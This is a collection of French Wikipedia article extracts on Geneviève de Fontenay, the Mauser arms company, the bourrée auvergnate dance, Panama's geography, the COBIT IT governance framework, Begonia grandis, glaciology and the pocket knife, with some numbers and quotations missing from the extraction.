Elle soutient le candidat du parti En marche, Emmanuel Macron, pour l'élection présidentielle de 2017. Elle est également présente à son meeting à Lyon le , à l'invitation du sénateur-maire de Lyon Gérard Collomb. En , toutefois, elle lance avec Florian Philippot une initiative contre la politique antisociale du président Emmanuel Macron . Elle précise cependant ne pas soutenir politiquement le président des Patriotes. Cette annonce déclenche une polémique, du fait du passé frontiste de Florian Philippot. Geneviève de Fontenay déclare alors qu'elle n'apparaîtra plus à ses côtés en indiquant : .
Après avoir soutenu le mouvement des Gilets jaunes, elle s'en désolidarise trouvant le blocage des ronds-points.
En 2019, alors que la présidente de la Société Miss France Sylvie Tellier avance qu'elle , Geneviève de Fontenay se déclare résolument hostile à cette idée, qu'elle juge , et . Les associations STOP Homophobie et SOS Homophobie déposent plainte pour et . La mort de Geneviève de Fontenay entraîne l'extinction de la procédure judiciaire.
Honneurs.
En marge de l'élection de Miss Seine-et-Marne 2002 à Lizy-sur-Ourcq, ville où elle passait ses vacances étant enfant, Geneviève de Fontenay reçoit la médaille du Mérite et dévouement français, récompensant « le bien et la valeur ».
Elle refuse la Légion d'honneur et déclare dans une interview publiée le 2 janvier 2015 : .
Mort et hommages.
Geneviève de Fontenay meurt à l'âge de , le à la clinique du Val d'Or de Saint-Cloud, des suites d'une crise cardiaque. Selon ses dernières volontés, elle est inhumée aux côtés de son compagnon Louis et de son fils Ludovic dans une cérémonie respectant une stricte intimité familiale au cimetière parisien d'Ivry-sur-Seine.
Le , lors de l'élection de Miss France 2024, un hommage lui a été rendu avec notamment un tableau regroupant de Muguette Fabris (Miss France 1963) à Indira Ampiot (Miss France 2023).
En , Hubert Guérin, son dernier collaborateur, publie "Les derniers secrets de la dame au chapeau", la première biographie officielle posthume. L'auteur y révèle notamment les violences physiques et psychologiques que Madame de Fontenay aurait subies de son fils cadet Xavier.

</doc>
<doc id="248790" url="https://fr.wikipedia.org/wiki?curid=248790" title="Mauser">
Mauser

La Mauser Waffenfabrik, couramment appelée Mauser, est une entreprise allemande de fabrication d'armes, installée à Oberndorf am Neckar. Le nom complet de l'entreprise est aujourd'hui Mauser-Werke Oberndorf Waffensysteme GmbH.
La firme a fourni plusieurs modèles de fusils et de pistolets à l'armée allemande ainsi qu'au marché civil, pendant les et s. Le système de culasse de la carabine modèle 98 est encore très souvent utilisé sur des fusils de chasse au gros gibier. Parmi les pistolets Mauser les plus célèbres de l'entreprise figurent les Mauser C96 et Mauser M712 Schnellfeuer.
Histoire.
Des origines au Troisième Reich.
La manufacture d'armes royale d'Oberndorf est créée le par Frédéric de Wurtemberg ; l'année suivante, elle emploie déjà .
Wilhelm et Paul Mauser y conçoivent en 1867, un premier fusil se chargeant par une culasse rotative, basée sur le Chassepot français, lui-même s'inspirant de fusils prussiens antérieurs. La guerre franco-allemande de 1870 ayant démontré la supériorité du fusil français, leur plus récent modèle, le Gewehr 71 (fusil modèle 1871) est sélectionné par la nouvelle armée allemande, comme fusil d'ordonnance, en dépit de la concurrence du fusil bavarois Werder M1869.
La production commence à Oberndorf ; trois modèles tirant une cartouche de sont fabriqués : un fusil standard d'infanterie avec un canon long de , une carabine pour les Jäger (chasseurs, troupes légères) avec une longueur de canon de et une autre de cavalerie dont le canon est long de seulement. Par ailleurs, la Serbie produit, sous licence, une version améliorée de l'arme en calibre , le Mauser-Milovanovich M1878/80.
En 1886, l'armée française adopte le Lebel modèle 1886, utilisant une cartouche de plus faible calibre comprenant de la poudre sans fumée, et les autres pays ne vont pas tarder à essayer d'en faire autant. L'Allemagne crée un fusil à répétition, sans l'aide de Paul Mauser cette fois, mais en utilisant pour la première fois des cartouches à gorge à parois cylindriques et à collet restreint : la 7,92 × 57 est née, et toutes les munitions de fusil réalisées depuis n'en sont que des dérivés. L'année suivante, l'Italien Vetterli-Vitali introduit lui l'alimentation par une boîte chargeur, plus fiable et permettant une cadence de tir plus élevée.
L'armée allemande adopte ces deux innovations avec le fusil Mannlicher Modell 1888, qui tire une nouvelle cartouche, la . Paul Mauser travaille lui aussi sur des fusils à répétition, il met au point un système d'extracteur, mais, ayant des difficultés avec les boîtes chargeurs, il utilise des chargeurs tubulaires sous le canon. Son Gewehr 92 n'est pas un franc succès, car il perd la compétition de l'armée américaine, au profit du Krag-Jørgensen ; seuls quatre cents exemplaires de la version carabine seront vendus à la marine espagnole. Les premières commandes étrangères arrivent avec les Mauser 1889 (Belgique), Mauser 1890 (Empire ottoman) et Mauser 1891 (Argentine). Le succès arrive avec le modèle Gewehr 93, qui, avec son magasin vertical de cinq cartouches de calibre (connu plus familièrement comme le Mauser), devient le fusil règlementaire espagnol et de nombreux pays d'Amérique latine. La bataille de San Juan verra espagnols tenir en respect, pendant douze heures, armés du Krag-Jørgensen.
Cet événement semble avoir joué un rôle dans l'acquisition de la licence du verrou de culasse Mauser, par les États-Unis et son utilisation dans leur fusil Springfield M1903. La bataille a aussi un effet très bénéfique sur les ventes de la firme allemande.
La Turquie se porte également acquéreuse du Gewehr 93 et le Brésil du Gewehr 94. Le modèle suivant, le Gewehr 1895 remporte des succès encore plus retentissants, le Mexique, le Chili, l'Uruguay, la Chine, l'Iran, la Serbie (Mauser 99) et les Boers l'adoptent. Enfin la Suède et le Luxembourg choisissent le Gewehr 96 (une évolution directe du Modell 1894). Durant la révolution mexicaine, Emiliano Zapata disait pouvoir compter sur armés de fusils Mauser.
Paul Mauser s'intéresse aussi au pistolet semi-automatique et son Mauser C96 remporte lui aussi un grand succès commercial. Devant cette réussite, le contrôle de l'usine est cédé aux frères Mauser et celle-ci devient la Waffenfabrik Mauser AG. Pour compléter le tableau, reste à obtenir le marché le plus juteux, l'équipement de l'armée allemande.
Le Gewehr 98 emporte ce marché en 1898 ; le fusil et son dérivé le Karabiner 98k deviennent les fusils standards de la Heer, jusqu'en 1945. Mais en 1941, le prototype de fusil semi-automatique destiné à prendre la relève se révéla complètement impropre à l'utilisation sur le terrain, et, après une petite production, il fut supplanté par son rival le Walther G43.
Après la Seconde Guerre mondiale.
Avec la chute du Troisième Reich, l'occupation d'Oberndorf fut confiée aux troupes françaises. Sur l'ordre d'un responsable local, l'usine fut alors démantelée et les archives détruites. Edmund Heckler, Theodor Koch et Alex Seidel, anciens ingénieurs de chez Mauser, formèrent alors la société Heckler &amp; Koch, qui devint le principal fournisseur d'armes légères de l'armée allemande. La firme Mauser existe toujours et, devenue filiale de Rheinmetall, elle produit des canons-mitrailleurs, comme le Mauser BK-27 qui équipe l'avion de combat Eurofighter Typhoon.
Néanmoins, la branche qui produit les fusils civils a été séparée du reste de la société en 1999. Elle porte désormais le nom de « Mauser Jagdwaffen GmbH », et a son siège à Isny/Allgäu. Elle ne produit que des fusils pour la chasse, y compris le M98 et le M98 Magnum qui sont de nouveau fabriqués à l'identique de leurs versions d'origine.
Sur le marché civil, les fusils Mauser et leurs dérivés furent et sont souvent utilisés pour la chasse au gros gibier, en particulier en Afrique, parfois en utilisant des munitions de très gros calibre comme le .9,5x57 cal .416 cal .500 cal (). Parmi les fabricants de ce genre, on trouve par exemple, , Česká zbrojovka a.s., SIG Sauer ou Zastava Arms.

</doc>
<doc id="248791" url="https://fr.wikipedia.org/wiki?curid=248791" title="Bourrée auvergnate">
Bourrée auvergnate

La bourrée auvergnate est une danse traditionnelle, originaire d'Auvergne puis répandue dans tout le Centre de la France. Elle se danse à deux, ou bien à quatre (en « quadrette »).
La danse.
La bourrée est une danse populaire d'Auvergne qui s'est répandue dans toute l'Europe occidentale par le biais des bals folks. Devant la diversité des formes pratiquées, il est difficile d'en faire une description précise. Les éléments qui la spécifient sont : 
Traditionnellement, la bourrée était dansée entre hommes ou entre femmes, car il s'agit plutôt d'un moment de défi et de complicité que d'une danse de séduction. Esprit Fléchier, dans ses "Mémoires sur les grands jours d'Auvergne en 1665-1666", témoigne déjà de cette exception sociale quand il voit les femmes danser la bourrée entre elles pour se défier et s'amuser. 
Il est important de distinguer la bourrée « auvergnate » proprement dite, c'est-à-dire la bourrée à trois temps, notée « Montagnarde » dans l"'Album auvergnat" de Jean-Baptiste Bouillet (1848), de la bourrée en lignes à deux temps. La première est répandue dans le Puy-de-Dôme, la Haute-Loire, le Cantal, le Lot, l'Aveyron, la Lozère, l'Ardèche, le Morvan, pays Sancerrois et dans tout le Limousin, et la deuxième est pratiquée surtout en Bourbonnais (Allier), en Berry, Nivernais et dans tout le Centre-France : Les danseurs du bal sont alors disposés en une ligne, en deux lignes vis-à-vis ou côte-à-côte, en quatre lignes, etc.
La bourrée d'Auvergne, à trois temps, est une danse assez libre dont la simplicité de la base chorégraphique permet de nombreuses interprétations, variations et ornementation; du fait également du grand nombre de formes différentes collectées dans les différents cantons. Le pas de base est un pas glissé à trois temps, chaque pied marquant les appuis de la base rythmique. Elle repose sur une forme standard alternant les tiroirs et les ellipses (voir figures).
Quand elles ne sont pas dansées à deux, les bourrées sont l'occasion de chorégraphies très particulières. Les plus célèbres sont :
Certaines formes de bourrées à deux se différencient également des autres (comme la Giatte en Combrailles).
Figures.
Il existe un grand nombre de figures de bourrée, variant selon les habitudes des danseurs. En voici quelques-unes, que l'on peut voir danser fréquemment dans les bals traditionnels. 
Dans le cas où la bourrée est dansée en quadrette, voici la position de départ des figures présentées ci-dessous : chaque homme est face à sa cavalière et à droite de sa voisine. Voici quelques figures pouvant être réalisées lorsque la bourrée est dansée en quadrette :
La bourrée auvergnate peut également se danser à deux. Le plus souvent, les deux danseurs effectuent les figures suivantes : 
La musique.
La musique de la bourrée en auvergne a accompagné les modes des siècles qu'elle a traversés. Depuis toujours chantée, elle a été jouée aux fifres et aux tambours du temps de l"Album auvergnat", puis les iconographies et les archives sonores des deux derniers siècles témoignent de leur interprétation à la vielle à roue, au violon, à l'accordéon, au banjo et sur de multiples cornemuses comme la cabrette, instrument emblématique du succès national de la musique des Auvergnats de Paris au début du Siècle. Lors du mouvement orphéoniste, on la pratiquait aux clarinettes, saxophones, cuivres... Aujourd'hui, elle bénéficie de tous les apports des musiques avec lesquelles elle cohabite (jazz, rock, classique...) et tend à s'électrifier lentement depuis les années 1990. Le groupe Super Parquet ou l'artiste Sourdure s'en saisissent aujourd'hui avec l'usage des lutheries électroniques. 
Souvent, les bourrées n'ayant pas de paroles, les chanteurs improvisent sur la mélodie avec des onomatopées. Mais les collectages effectués vers la fin du montrent qu'un très grand nombre de bourrées sont chantées avec des paroles, en auvergnat, sont souvent courtes et qui ne servent, pour les musiciens, qu'à se remémorer la musique. Certaines bourrées se chantent néanmoins en français. Il en existe même qui se chantent aussi bien français qu'en auvergnat. Parmi celles-ci, on trouve "Lo parpalhòl" (le papillon), dont les paroles en français sont :
De manière générale, les bourrées dansées dans les bals folks ont la forme suivante : 
Le plus souvent, on trouve une cadence suspensive à la fin des quatre premières mesures de la phrase puis une cadence conclusive à la de la phrase. Il en est de même pour la et la .
Cependant, la musique n'est pas toujours régulière : il peut y avoir deux ou trois phrases musicales (voire quatre plus rarement).
Chaque phrase peut être ou non doublée et comporte entre 6 et 12 mesures. Par exemple : 
Aujourd'hui, certains joueurs de bourrée s'appliquent à donner une fraicheur actuelle aux airs collectés, en adaptant les mélodies, les harmonisant d'une autre manière, et en utilisant aussi une palette d'instruments beaucoup plus larges.
Évocation contemporaine.
Le , sur la passerelle Debilly à Paris, la bourrée auvergnate est mise à l'honneur dans la cérémonie d'ouverture des Jeux olympiques d'été par deux danseurs effectuant quelques pas sur l'air de "Sandstorm", du DJ finlandais Darude.

</doc>
<doc id="248793" url="https://fr.wikipedia.org/wiki?curid=248793" title="Kim Jee-Woon">
Kim Jee-Woon



</doc>
<doc id="248794" url="https://fr.wikipedia.org/wiki?curid=248794" title="Im Kwon-Taek">
Im Kwon-Taek



</doc>
<doc id="248795" url="https://fr.wikipedia.org/wiki?curid=248795" title="Géographie du Panama">
Géographie du Panama

Entouré par la mer des Caraïbes, l'océan Pacifique, la Colombie ( de frontière) et le Costa Rica (), le Panama est un pays d'Amérique centrale, situé à 9° nord et 80° ouest et s'étendant sur .
Le canal de Panama permet aux bateaux de passer de l'océan Atlantique à l'océan Pacifique et inversement, sans devoir contourner le continent américain par le sud de l'Argentine.
Formation.
Le territoire de Panama est né il y a 15 millions d'années d'un phénomène de subduction qui a créé un groupe d'îles. Elles représentent aujourd'hui les péninsules de Azuero et Burica. La spécificité de ce territoire s'il est comparé à ses voisins est qu'il est issu de la collision des plaques des Caraïbes, de Nazca et celle de l'Amérique du Sud alors que les pays de l'isthme se sont créés par le contact de celle des Caraïbes et de celle de Cocos.
Carte politique.
Le pays est divisé en 9 provinces auxquelles viennent s'ajouter les 5 comarques indigènes : Emberá-Wounaán, Kuna Yala, Ngöbe-Buglé (niveau province), Madungandí et Wargandí (niveau corregimientos). Les provinces n'ont pas changé depuis la déclaration d'indépendance en 1903. Leurs subdivisions sont les districts à leur tour divisés en corregimientos (qui sont eux modifiés en fonction des mouvements de population).
Les frontières avec le Costa Rica et la Colombie sont clairement démarquées et ne sont plus l'objet de différend depuis la fin des années 1980. Le pays bénéficie d'autre part d'une ZEE de 200 milles nautiques.
Côtes.
La côte nord est semée de ports naturels. Le port de Cristóbal, situé à la sortie du canal dans la mer des Caraïbes, est le seul à bénéficier d'importantes infrastructures. Cependant, les nombreuses îles de l'archipel de Las Bocas del Toro, fournissent un abri suffisant pour le port bananier d'Almirante.
À l'ouest la côte est découpé en baie Almirante, laguna de Chiriquí et golfe des Moustiques.
Du côté de la frontière colombienne, la côte est ornée d'environ 350 îles qui s'étendent sur environ .
Sur la côte Pacifique, il y a les golfes de Chiriquí, de Panama, de Parita et de San Miguel.
Le port principal est Balboa mais les profondeurs n'étant pas suffisantes ajoutées à une forte marée ne permettent pas vraiment le développement de ports importants. Environ 1000 îles se trouvent dans la partie sud du pays dont celle de Taboga, dévouée au tourisme qui est visible depuis Panama.
Située à vingt kilomètres des côtes panaméennes, l'Île Coiba a servi de prison jusqu'en 2004. Cet isolement a permis de préserver la forêt primaire et les fonds marins. Aujourd'hui, on peut visiter le site inscrit au patrimoine mondial, et les cellules grignotées par la jungle.
Relief.
Le relief est marqué par une chaîne de montagnes qui forme une division du territoire par le milieu. La partie nord ne fait pas partie de la chaîne d'Amérique du Nord et seulement la partie la plus proche de la frontière colombienne fait partie de l'ensemble andin. La majeure partie du relief est due à l'activité volcanique et est considérée comme la cordillère centrale par les géographes.
Le Volcán de Chiriquí, situé sur la cordillère de Talamanca, culmine à et bien qu'il ne soit plus actif depuis des millénaires, il garde le nom de volcan. La partie qui l'entoure est la plus riche du pays au niveau sol.
Cours d'eau.
Un peu moins de 500 cours d'eau arrosent le territoire escarpé. La plupart sont des torrents descendant des hautes terres, et sont complètement innavigables. Seuls le Río Chepo et le Río Chagres sont exploités comme source d'électricité.
Le Río Chagres est un des plus longs des 150 fleuves qui alimentent la mer des Caraïbes. On retrouve sur son cours le lac Gatún et le lac Madden qui fournissent l'électricité à toute la zone environnante.
Le Río Chepo se jette quant à lui dans le Pacifique et, à l'image des 300 fleuves qui se jettent de ce côté, est beaucoup moins tumultueux. La raison est la plus faible déclinaison du terrain et cette partie comprend aussi le seul fleuve navigable : le Río Tuira.
Lacs.
Il n'existe que 3 lacs qui sont des lacs de barrage artificiels :
Climat.
L'ensemble du territoire se situe dans la zone tropicale et connait des températures uniformes et hautes. Il y a très peu de variations saisonnières. Durant la saison sèche, les températures se situent entre et 32.6c
D'autre part, les températures sont supérieures sur la côte Caraïbe que sur la partie Pacifique. Dans les montagnes, les températures peuvent descendre en dessous de .
Les régions climatiques sont plutôt divisées sur la base des précipitations que sur les températures. Les précipitations, essentiellement composées de pluie, varient de 1,3 à selon les années et ont lieu durant la saison des pluies qui s'étire d'avril à décembre malgré quelques différences sur la longueur. Le cycle pluvieux est déterminé par trois facteurs principaux :
Les précipitations sur la partie sud sont environ égales à la moitié de celles sur la côte caraïbe. Malgré des épisodes orageux particulièrement violents le pays est hors des couloirs cycloniques.
Flore.
Le territoire tropical de Panama accueille un grand nombre de plantes et 40 % du territoire sont recouverts de forêts malgré une réduction de moitié depuis les années 1940. La majeure partie de l'agriculture, de subsistance, est composée de maïs, de haricots et de divers tubercules. Les terres arables sont principalement situées dans le nord-est et le sud-ouest du pays. La principale culture d'exportation est la banane dont la production recouvre la majeure partie des deux côtes.
Récapitulatif.
Coordonnées géographiques : 
Références cartographiques :
Amérique centrale et les Caraïbes
Territoire:
"total :"
"terre :"
"eaux :"
Frontières :
"total :"
"pays :"
Colombie , Costa Rica 
Côtes :
Souveraineté maritime:
"zone continue :"
24 milles nautiques ()
"zone économique exclusive :"
200 milles nautiques ()
"mer territoriale :"
12 milles nautiques ()
Climat :
Climat tropical maritime ; chaud, humide, nuageux ; longue saison des pluies (de mai à janvier), saison sèche courte
Terrain :
intérieur des terres escarpé et montagneux ; régions côtières planes ou faiblement vallonnées
Points extrêmes :
"point le plus bas :"
Océan Pacifique 
"point culminant :"
Volcan de Chiriqui 
Ressources naturelles :
Hydroélectricité
Utilisation des terres (1993) :
"terres arables:"
7 %
"cultures permanentes :"
2 %
"pâtures permanentes :"
20 %
"forêts :"
44 %
"autres :"
27 %
terres irriguées (1993) :
Dangers écologiques :
NA
Environnement - problèmes actuels :
Environnement - accords internationaux :
"signés :"
Convention sur la diversité biologique, Programme des Nations unies sur le changement climatique, Protocole de Kyoto, Désertification, Convention sur le commerce international des espèces de faune et de flore sauvages menacées d'extinction, Convention de Stockholm sur les déchets dangereux, Convention des Nations unies sur le droit de la mer, Convention sur la prévention de la pollution des mers résultant de l'immersion de déchets, Interdiction des essais nucléaires, Protection de la couche d'ozone, Pollution marine, Accord international sur les bois tropicaux (1983 et 1994), Zones humides, chasse à la baleine
"signé mais pas ratifié :"
Conservation de la vie maritime

</doc>
<doc id="248798" url="https://fr.wikipedia.org/wiki?curid=248798" title="COBIT">
COBIT

COBIT (pour « "" », ou « objectifs de contrôle de l'information et des technologies associées » en français) est un référentiel de bonnes pratiques d'audit informatique et de gouvernance des systèmes d'information d'origine américaine. Au fil des versions successives, il tend à devenir un outil fédérateur de gouvernance des systèmes d'information en intégrant progressivement les apports d'autres référentiels tels que ISO 9000, ITIL
Historique.
La gouvernance des Systèmes d'Information "(Information Technology (IT) Governance)" s'est diffusée au sein des entreprises dans un contexte où d'une part, l'automatisation des fonctions de l'entreprise est devenue une composante essentielle au sein de l'entreprise et d'autre part, les dirigeants ne voient pas comment les SI peuvent apporter de la valeur et de la performance dans l'organisation. Ainsi, on peut parler de gouvernance des SI et donc de normes et certifications permettant cette dernière. C'est également dans un souci de transparence des informations que les SI se sont développés et que leur contrôle est devenu incontournable. Le référentiel principal de gouvernance et d'audit des SI est le COBIT. En résumé le COBIT est un cadre de référence pour maîtriser la gouvernance des SI dans le temps. Il est fondé sur un ensemble de bonnes pratiques collectées auprès d'experts du SI.
COBIT a été développé en 1994 (et publié en 1996) par l'ISACA ("Information Systems Audit and Control Association"). L'ISACA a été créé en 1967 et est représenté en France depuis 1982 par l'AFAI (Association française de l'audit et du conseil informatiques). C'est un cadre de contrôle qui vise à aider le management à gérer les risques (sécurité, fiabilité, conformité) et les investissements. COBIT a évolué, la version 4 est apparue en France en 2007.
COBIT est une approche orientée processus, qu'il regroupe en quatre domaines (planification, construction, exécution et métrologie, par analogie avec la Roue de Deming), 34 processus distincts qui comprennent en tout 215 activités et un nombre plus important encore de « pratiques de contrôle ». Un volet « évaluation des systèmes d'information », connu sous le nom de Val IT tente de compléter cette approche.
La version 5 de COBIT est disponible depuis . COBIT 5 est, à ce jour, le seul référentiel qui est orienté business pour la Gouvernance et la Gestion des Systèmes d'Information de l'entreprise. Il représente une évolution majeure du référentiel.
COBIT 5 peut être adapté pour tous les types de modèles business, d'environnements technologiques, toutes les industries, les lieux géographiques et les cultures d'entreprise. Il peut s'appliquer à :
Le référentiel COBIT 5 simplifie les défis de la gouvernance avec seulement cinq principes et sept facilitateurs. Il permet l'intégration avec d'autres approches et normes, incluant TOGAF, PMBOK, PRINCE2, COSO, ISO/CEI 20000, ISO/CEI 27001, ITIL, PCI DSS, Loi Sarbanes-Oxley et Bâle III.
En , l'ISACA a annoncé la sortie progressive de la version 2019 de COBIT.
Principes de COBIT.
COBIT fournit aux gestionnaires, auditeurs et utilisateurs de TIC (Technologies de l'information et de la communication), des indicateurs, des processus et des bonnes pratiques pour les aider à maximiser les avantages issus du recours à des techniques informatiques et à l'élaboration de la gouvernance et du contrôle d'une entreprise. Il les aide à comprendre leurs systèmes informatiques et à déterminer le niveau de sécurité et de contrôle qui est nécessaire pour protéger leur entreprise, et ceci par le biais du développement d'un modèle de gouvernance des systèmes d'information tel que COBIT. Ainsi, COBIT fournit des indicateurs clés d'objectif, des indicateurs clés de performance et des facteurs clés de succès pour chacun de ses processus. Le modèle COBIT se focalise sur ce que l'entreprise a besoin de faire et non sur la façon dont elle doit le faire.
Le référentiel COBIT constitue une structure de relations et de processus (cadre de référence ou "framework") visant à un pilotage et un contrôle des techniques informatiques par le management de l'entreprise pour atteindre ses objectifs, en utilisant ces techniques comme moyen pour améliorer l'activité et répondre aux besoins métiers, besoins consolidés dans le plan stratégique de l'entreprise. Il est basé sur 5 clés principales de la gouvernance et gestion IT :
Fondamentaux de COBIT 5.
Une des principales nouveautés de COBIT 5 est d'aborder le système d'information, au-delà des processus déjà mis en avant par COBIT 4.1,  au travers d'autres thématiques  complémentaires, dans le cadre d'une approche globale (ou systémique). L'ensemble de ces thématiques contribue de manière interdépendante à la maîtrise de la gouvernance et du management du SI. 
COBIT 5 définit 37 processus regroupés en cinq domaines.
Des adaptations ont été réalisées sur cette version afin d'assurer une meilleure convergence avec d'autres référentiels tels que ITIL et CMMI.  Ainsi le COBIT 5, encore plus que COBIT 4.1, aidera les DSI à mettre en œuvre une démarche d'amélioration globale de la DSI, homogène et coordonnée, qui ne se focalise pas que sur les processus.
Fondamentaux de CobiT 4.1.
COBIT 4.1 définit 34 processus regroupés en quatre domaines.
Le COBIT consiste à décomposer tout système informatique en :
COBIT s'adresse à différents utilisateurs :
Le package COBIT 4.1.
Il comprend six publications :
L'objectif est d'assurer l'adéquation durable entre les technologies, les processus métiers et la stratégie de l'entreprise.
Critères de l'information.
Cette rubrique va intéresser la direction générale en indiquant ce que l'implantation d'un processus donné va apporter sur les informations (par exemple sur l'information décisionnelle). Ces critères sont : 
En améliorant l'information selon ces critères, l'organisation pourra atteindre plus facilement ses objectifs, cela ouvrira des nouvelles opportunités et améliorera la rentabilité.
Les ressources.
Cette partie concerne plus le directeur des systèmes d'informations (DSI) ou responsable des systèmes d'informations (RSI), pour l'informer des ressources qui vont être impactées par le processus. Les différentes ressources sont :
Les processus.
Destinés à l'attention du gestionnaire de processus, ils vont définir la structure des domaines, des processus et des tâches. Il faut savoir qu'un processus se définit comme un ensemble de tâches. Par exemple, le processus « comptable » intervient dans le domaine « administratif et financier » et se divise en activités telles que « la saisie de factures, l'édition de balance… ». CobiT propose un modèle de maturité pour chaque processus afin de le situer par rapport aux meilleures pratiques du marché. Le modèle comprend 6 niveaux (0 à 5).
Les facteurs clés de succès définissent les actions les plus importantes à entreprendre pour maîtriser les processus. Les indicateurs clés d'objectif permettent de savoir "a posteriori" si un processus a répondu aux objectifs (en ce qui concerne les critères d'information). Enfin, les indicateurs clés de performance déterminent la qualité de fonctionnement d'un processus (capacité à atteindre les objectifs).
CobiT Quickstart.
Cette version simplifiée de CobiT s'adresse principalement aux PME pour lesquelles les techniques informatiques ne représentent pas un enjeu stratégique mais simplement un levier dans leur stratégie de croissance. Elle se repose sur les hypothèses suivantes : 
Cette version conserve de COBIT 30 processus sur les 34, et 62 objectifs de contrôle sur les 318.
La mise en œuvre Quickstart comprend six étapes :
Limites.
Selon Georges Épinette, administrateur du CIGREF, la démarche d'appréhension de ce référentiel doit se faire intelligemment, notamment lorsqu'il s'agit du cycle de vie de la relation client-fournisseur. En effet, CobiT présente une relative indigence en matière :
En particulier, CobiT repose sur une approche très fonctionnelle de l'organisation. Sur ce modèle, le Système d'information opère en parallèle de l'organisation réelle - et d'une certaine manière, déconnecté de celle-ci - car il se base sur l'agencement nominal des fonctions. Dans ce contexte, l'alignement du système d'information consiste à réconcilier, souvent de façon ponctuelle, la réalité des opérations avec une vision idéalisée de l'organisation. D'autres approches, qui mêlent de façon dynamique Système d'information et Organisation selon des modélisations qui étendent le modèle fonctionnel évitent cet écueil : c'est le cas, par exemple, de l'Analyse décisionnelle des systèmes complexes inspirée des travaux de l'école socio-technique et du courant cybernétique.
Un groupe de travail du club des maîtres d'ouvrage des systèmes d'information a publié en 2006 une étude sur CobiT, dans laquelle figurent un certain nombre de remarques sur les apports et les limites de CobiT.

</doc>
<doc id="248805" url="https://fr.wikipedia.org/wiki?curid=248805" title="Giovanni da Fidanza">
Giovanni da Fidanza



</doc>
<doc id="248816" url="https://fr.wikipedia.org/wiki?curid=248816" title="Begonia grandis">
Begonia grandis

Begonia grandis est une espèce de plantes herbacées vivaces de la famille de la famille des "Begoniaceae". Ce bégonia est originaire des sous-bois d'Asie orientale tempérée (Chine, Japon). L'espèce fait partie de la section "Diploclinium" ; elle a été décrite en 1791 par le botaniste suédois Jonas Carlsson Dryander (1748-1810). L'épithète spécifique, "", signifie « imposant, grandiose ».
Description.
Cette plante produit en automne des bulbilles à l'aisselle de ses tiges qui lui permettent d'accélérer sa dissémination.
Il existe de nombreuses sous-espèces et formes de cette espèce rustique, dont une variété à fleurs blanches : "Begonia grandis" var. "alba". En france la plus connue est "Begonia grandis" ssp. "evansiana".
Liste des sous-espèces et variétés.
Selon :
Selon (Attention liste brute contenant possiblement des synonymes) :
Liens externes.
Bases de référence :
Iconographie :

</doc>
<doc id="248817" url="https://fr.wikipedia.org/wiki?curid=248817" title="Glaciologie">
Glaciologie

La glaciologie est une science de la Terre qui étudie la nature physique et chimique des systèmes glaciaires et périglaciaires. Il s'agit donc de l'étude de la cryosphère, c'est-à-dire de tout ce qui a trait aux glaciers, à la glace et aux phénomènes liés à la glace comme le pergélisol, la transformation de la neige en névé puis en glace, les interactions air-neige, etc.
Les glaciologues se préoccupent de déterminer les principales caractéristiques des surfaces englacées. D'un point de vue physique, le bilan de masse glaciaire et le comportement mécanique du « matériau glace » sont les points clés de la recherche actuelle. Sur le plan chimique, les interactions entre la glace, le sol et l'air sont étudiées en vue de mieux comprendre l'évolution de la glace. Une grande partie des échantillons de glace sont prélevés sur des carottes de glace. La glaciologie est également au centre de la paléoclimatologie, les glaces des inlandsis se comportant comme de véritables « archives » des conditions de température et d'atmosphère sur la période du Quaternaire. Les études glaciologiques ont été fondamentales dans la mise en évidence des liens entre température moyenne du globe et concentration atmosphérique en gaz à effet de serre. La glaciologie est donc une discipline majeure dans la compréhension du système climatique.
Histoire de la glaciologie.
Les précurseurs, sont nombreux.

</doc>
<doc id="248818" url="https://fr.wikipedia.org/wiki?curid=248818" title="Glaçiologie">
Glaçiologie



</doc>
<doc id="248819" url="https://fr.wikipedia.org/wiki?curid=248819" title="Canif">
Canif

Un canif ( ), ou encore couteau de poche ou couteau pliant, est un couteau dont la ou les lames se replient dans le manche.
Étymologie.
Le mot français "canif" est cité en 1441-42 sous la forme "quenif" et sous sa graphie actuelle en 1611. Il est probablement dérivé du francique "*knif", tout comme le mot anglais "knife". Au Moyen Âge, le canif se nomme « canivet » « canivel » ou « quenivet ». L'inventaire de 1418, recensant les biens du château de Vincennes mentionne .
Terminologie.
"L’Encyclopédie ou Dictionnaire raisonné des sciences, des arts et des métiers", éditée de 1751 à 1772 sous la direction de Diderot, D’Alembert et Voltaire, indique que le canif est une .
De même, Jean-Jacques Perret (1730-1784) distingue en 1771 dans son "Art du coutelier", les canifs droits des canifs fermants. La description qu'il fait du montage des canifs montre bien que dans son esprit, un canif sert à entretenir les plumes utilisées pour l'écriture : . Il ajoute d'ailleurs : .
Camille Pagé explique en 1896 que le canif est un petit couteau à tranchant très fin. Il mentionne une longue liste de canifs d'écrivain, dont un canif à ressort dont le manche sert de coupe-papier et un deuxième à deux lames dont l'une est utilisée pour couper les cors.
Le terme « canif » est souvent remplacé par ceux de « couteau de poche » ou de « couteau pliant ». On trouve également « couteau fermant » et « couteau à virole ».
Selon Auguste-Denis Fougeroux de Bondaroy (1732-1789), certains couteaux fermants se nomment "Jambettes", "Dauphines", "Eustache-Dubois" ou encore "couteaux à la capucine".
Des couteaux pliants de femme, fabriqués à Thiers, se sont appelés "mossudes" aux .
Couteau à gaine.
L’acception contemporaine de « couteau de poche » ne porte pas à confusion. Il n’en est pas de même avant le . Lorsque Camille Pagé indique en 1896 , le couteau de poche en question peut être un objet à lame protégée par une gaine, à la différence des couteaux fermants.
La gaine à couteau est à l’origine un fourreau ou étui servant à se protéger lors du port, dans la poche ou à la ceinture, d'un objet coupant ou perçant. Selon Jean de Garlande, un coutelier du .
Au , nombre de ces gaines sont recouvertes de galuchat.
Au , on distingue parmi les couteaux à gaine, le couteau à plate semelle au manche constitué de deux parties qui s’ajustent sur le prolongement de la lame à l’aide de trois clous, et le couteau à mitre, caractérisé par un rebord présent à la jonction de la lame et du manche, et dont il recouvre l’épaisseur ; la lame est alors prolongée par une tige ou une queue forgée s’enfonçant dans le manche, appelée « quehenne » dès le , puis « soie ».
Langues et dialectes.
Camille Pagé, pour la rédaction de son ouvrage "La coutellerie depuis l'origine jusqu'à nos jours", publié entre 1896 et 1904, a rassemblé des traductions des vocables "couteau", ciseau, "canif" et " rasoir" tant parmi les langues mortes que parmi celles en cours au tournant des et les a retranscrites en alphabet latin.
